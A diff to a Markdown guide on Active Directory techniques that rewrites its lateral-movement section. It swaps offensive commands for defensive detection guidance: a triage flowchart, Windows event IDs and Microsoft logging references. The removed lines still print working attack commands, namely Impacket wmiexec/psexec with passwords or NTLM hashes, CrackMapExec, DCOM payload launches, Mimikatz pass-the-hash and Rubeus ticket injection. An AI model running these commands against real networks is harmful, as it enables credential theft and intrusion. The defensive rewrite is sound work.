@@ -319,54 +319,37 @@ Microsoft notes that SDProp runs every 60 minutes by default on the domain contr
  
 
 ## Lateral Movement
-
+ 
+Remote administration is common in managed Windows environments, so no single logon or remote-management event proves lateral movement. Correlate the destination host, account, source device, process, authentication type, service or task changes, and approved maintenance window.
+ 
+```mermaid
+flowchart LR
+    A[Remote logon or<br/>management activity] --> B[Destination: logon<br/>and authentication context]
+    B --> C[Correlate WMI, service,<br/>task, process, and network events]
+    C --> D[Compare account, host,<br/>role, and change window]
+    D --> E{Expected administration?}
+    E -->|Yes| F[Document baseline<br/>and retain evidence]
+    E -->|No or uncertain| G[Investigate source and<br/>follow response plan]
+```
+ 
 ### WMI Execution
-
-```bash
-# Remote process execution via WMI
-python3 wmiexec.py corp/Administrator:Password@TARGET
-python3 wmiexec.py corp/Administrator@TARGET -hashes :NTLM_HASH
-
-# CrackMapExec
-crackmapexec smb TARGET -u Admin -p Pass -x "whoami"
-crackmapexec winrm TARGET -u Admin -p Pass -x "whoami"
-```
-
+ 
+For investigations, review the Microsoft-Windows-WMI-Activity/Operational log alongside destination-host Security events, process creation, network telemetry, and the originating account. WMI is also used by inventory, monitoring, and management software; confirm the source host and service owner before escalating.
+ 
 ### PsExec / Service-Based
-
-```bash
-# Impacket psexec (uploads binary, creates service)
-python3 psexec.py corp/Admin:Pass@TARGET
-
-# smbexec (no binary upload - uses cmd.exe via service)
-python3 smbexec.py corp/Admin:Pass@TARGET
-```
-
+ 
+Remote service creation can support legitimate software deployment and administration. Correlate destination logon events (4624), service-install events (4697 or System 7045 where available), initiating process and binary provenance, and the change record. Event coverage depends on audit policy and platform configuration.
+ 
 ### DCOM Lateral Movement
-
-```powershell
-# Use DCOM objects for lateral execution (stealthier than psexec)
-$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "TARGET"))
-$com.Document.ActiveView.ExecuteShellCommand("C:\Windows\Temp\payload.exe", $null, $null, "7")
-
-# Via ShellWindows DCOM
-$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application", "TARGET"))
-$com.Windows() | ForEach-Object { $_.Document.Application.ShellExecute("payload.exe") }
-```
-
+ 
+DCOM/RPC is used by legitimate management software and Windows components. Review unusual remote activation in the context of the account, source system, destination role, process lineage, and firewall/network events. The prior claim that DCOM is inherently “stealthier” than service-based administration was unsupported and has been removed.
+ 
 ### Overpass-the-Hash
-
-Convert NTLM hash to Kerberos TGT for authentication:
-
-```powershell
-# Mimikatz
-sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:HASH /run:powershell.exe
-
-# Rubeus (more stealthy - doesn't spawn process with stolen token)
-.\Rubeus.exe asktgt /user:Administrator /rc4:NTLM_HASH /ptt
-```
-
----
+ 
+This term describes a credential-abuse pattern that can involve NTLM-derived material and Kerberos authentication. Investigate unusual account use across authentication protocols, unexpected source hosts, privileged logons, and subsequent service access. NTLM or Kerberos events on their own do not prove that a hash or ticket was reused.
+ 
+For log meanings and collection details, see Microsoft's [4624 event reference](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4624), [service-install event reference](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4697), and [WMI activity logging guide](https://learn.microsoft.com/en-us/windows/win32/wmisdk/logging-wmi-activity).
+ 
 
 ## Domain Persistence
 
